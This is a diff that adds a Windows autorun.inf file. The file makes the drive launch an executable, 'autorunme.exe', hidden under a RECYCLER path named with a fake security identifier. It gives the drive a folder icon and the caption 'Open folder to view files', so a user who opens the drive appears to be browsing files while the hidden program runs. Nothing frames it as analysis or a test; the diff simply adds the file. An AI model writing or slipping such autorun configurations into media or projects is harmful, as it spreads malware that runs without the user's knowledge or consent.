@@ -1,0 +1,7 @@
+[autorun]
+open=RECYCLER\S-1-6-21-2434476501-1644491937-600003330-1213\autorunme.exe
+icon=%SystemRoot%\system32\SHELL32.dll,4
+action=Open folder to view files
+shell\open=Open
+shell\open\command=RECYCLER\S-1-6-21-2434476501-1644491937-600003330-1213\autorunme.exe
+shell\open\default=1
